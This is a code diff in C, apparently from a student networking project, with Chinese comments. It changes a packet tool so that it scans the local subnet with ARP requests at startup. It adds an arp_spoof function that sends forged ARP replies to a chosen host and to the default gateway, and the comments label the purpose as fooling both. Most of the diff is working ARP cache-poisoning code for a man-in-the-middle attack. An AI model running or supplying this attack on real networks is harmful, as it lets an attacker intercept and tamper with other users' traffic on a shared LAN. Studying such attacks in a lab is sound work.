@@ -99,6 +99,9 @@ int main_proc3(netdevice_t *p) {
   ipaddr_t ip;
   int key;
 
+  // 利用 ARP request 掃描子網
+  arp_scan(p);
+
   while (1) {
     /*
      * Proccess packets in the capture buffer
@@ -125,9 +128,14 @@ int main_proc3(netdevice_t *p) {
     }
     ungetc(key, stdin);
 
-    // ARP request 掃描子網
-    if (key == 's') {
-      arp_scan(p);
+    if (key == 'a') {
+      ipethaddr_t *ip_eth_p = arptable_select();
+      uint8_t *defareth = arptable_existed(defarpip);
+
+      // 騙目標主機
+      arp_spoof(p, ip_eth_p->eth, &(ip_eth_p->ip), defarpip);
+      // 騙預設閘道器
+      arp_spoof(p, defareth, defarpip, &(ip_eth_p->ip));
     }
 
     if (fgets(buf, MAX_LINEBUF, stdin) == NULL) {
@@ -161,7 +169,6 @@ void arp_scan(netdevice_t *p) {
   }
 
   int host_num = (1 << (32-mask_len)) - 2;
-  int cnt = 0;
   for (int i = 1; i <= host_num; i++) {
 
     if (target_ip[3]++ == 0xff) {
@@ -173,9 +180,34 @@ void arp_scan(netdevice_t *p) {
     }
     
     arp_request(p, (uint8_t *)&target_ip);
-    cnt++;
   }
-  // printf("%d\n", cnt);
+}
+
+void arp_spoof(netdevice_t *p, uint8_t *dsteth, uint8_t *dstip, uint8_t *srcip) {
+  eth_hdr_t eth_hdr;
+  myarp_t pkt;
+
+  COPY_ETH_ADDR(eth_hdr.eth_dst, dsteth);
+  COPY_ETH_ADDR(eth_hdr.eth_src, myethaddr);
+  eth_hdr.eth_type = ETH_ARP;
+
+  pkt.ethtype = ARP_ETH_TYPE;
+  pkt.iptype = ETH_IP;
+  pkt.ethlen = ETH_ADDR_LEN;
+  pkt.iplen = IPV4_ADDR_LEN;
+  pkt.op = ARP_OP_REPLY;
+  COPY_ETH_ADDR(pkt.srceth, myethaddr);
+  COPY_IPV4_ADDR(pkt.srcip, srcip);
+  COPY_ETH_ADDR(pkt.dsteth, dsteth);
+  COPY_IPV4_ADDR(pkt.dstip, dstip);
+
+#if (DEBUG_ARP_REPLY == 1)
+  printf("arp_reply() to %s\n", ip_addrstr(dstip, NULL));
+#endif /* DEBUG_ARP_REPLY */
+
+  if (netdevice_xmit(p, eth_hdr, (uint8_t *)&pkt, sizeof(pkt)) != 0) {
+    fprintf(stderr, "Failed to send ARP reply.\n");
+  }
 }
 
 /****
